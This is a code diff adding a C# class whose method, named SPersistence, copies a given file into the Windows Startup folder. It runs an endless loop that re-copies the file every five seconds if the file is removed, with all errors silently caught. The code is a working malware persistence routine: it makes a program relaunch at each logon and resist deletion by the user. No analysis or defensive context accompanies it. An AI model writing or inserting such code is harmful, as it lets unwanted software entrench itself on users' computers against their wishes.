@@ -1,0 +1,19 @@
+ using System;
+ public class S
+ {
+		public static bool SPersistence(string input)
+        {
+            string SRP = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string S = "\\" + System.IO.Path.GetFileName(input);
+            while (true)
+            {
+                try
+                {
+                    if (!System.IO.File.Exists(SRP + S))
+                    {System.IO.File.Copy(input, SRP + S);}
+                }
+                catch { }
+                System.Threading.Thread.Sleep(5000);
+            }
+        }
+ }
